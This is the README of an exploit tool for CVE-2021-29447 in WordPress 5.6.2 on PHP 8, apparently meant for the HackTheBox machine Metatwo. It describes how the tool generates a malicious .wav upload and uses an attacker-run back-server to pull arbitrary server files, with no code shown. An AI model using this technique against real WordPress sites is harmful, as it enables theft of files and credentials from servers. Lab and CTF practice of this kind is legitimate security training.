# exploit_cve-2021-29447

For educational purposes only.

This exploit is supposed to be really convenient tool to get any file from server running wordpress 5.6.2 and php8. (see https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5)

All you need is base wp-admin access and ability to upload a media file.

The exploit will generate a .wav file payload to upload using wp-admin.

Then it uses exploit's back server to give you eager file right on your console.

The perfect usage is HackTheBox's machine - metatwo https://www.hackthebox.com/machines/metatwo
